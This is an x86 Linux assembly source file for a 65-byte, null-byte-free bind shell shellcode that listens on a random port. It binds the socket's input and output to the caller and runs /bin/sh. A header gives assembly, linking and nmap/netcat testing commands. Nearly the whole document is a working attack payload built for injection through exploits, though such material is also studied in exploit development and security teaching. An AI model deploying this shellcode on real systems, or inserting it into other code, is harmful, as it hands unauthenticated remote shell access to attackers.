; Shell Bind TCP Random Port Shellcode - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   shell_bind_tcp_random_port_shellcode
;
;   * 65 bytes
;   * null-bytes free
;   * the port number is set by the system and can be discovered using nmap
;     (see http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf, page 23, section 2.6.6)
;
;
;   # nasm -f elf32 shell_bind_tcp_random_port_shellcode.asm -o shell_bind_tcp_random_port_shellcode.o
;   # ld -m elf_i386 shell_bind_tcp_random_port_shellcode.o -o shell_bind_tcp_random_port_shellcode
;   # ./shell_bind_tcp_random_port_shellcode
;
;   Testing
;   # netstat -anp | grep shell
;   # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
;   # nc 127.0.0.1 port


global _start

section .text

_start:


        ; syscalls (/usr/include/asm/unistd_32.h)
        ; socketcall numbers (/usr/include/linux/net.h)

        ; Creating the socket file descriptor
        ; int socket(int domain, int type, int protocol);
        ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)


	push 102
	pop eax
	cdq

	push 1
	pop ebx

	push edx
	push ebx
	push 2

finalint:

	mov ecx, esp
	int 0x80

	mov esi, eax

        pop edi


	; There's no need of binding the socket (Posix Socket Inteface)


        ; Preparing to listen the incoming connection (passive socket)
        ; int listen(int sockfd, int backlog);
        ; listen(sockfd, 0);

	mov al, 102
	mov bl, 4

	push edx
	push esi

	mov ecx, esp

	int 0x80


        ; Accepting the incoming connection
        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
        ; accept(sockfd, NULL, NULL)

	mov al, 102
	inc ebx

	mov [esp+8], edx

	int 0x80

	xchg eax, ebx


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd);
	; dup2 (clientfd, ...)

	; mov ecx, edi

	pop ecx

dup_loop:
        mov al, 63
        int 0x80

        dec ecx
        jns dup_loop


        ; Finally, using execve to substitute the actual process with /bin/sh
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        ; exevcve("/bin/sh", NULL, NULL)

        mov al, 11

        push edx
        push 0x68732f2f
        push 0x6e69622f

        mov ebx, esp
        push edx
        push ebx

	jmp finalint
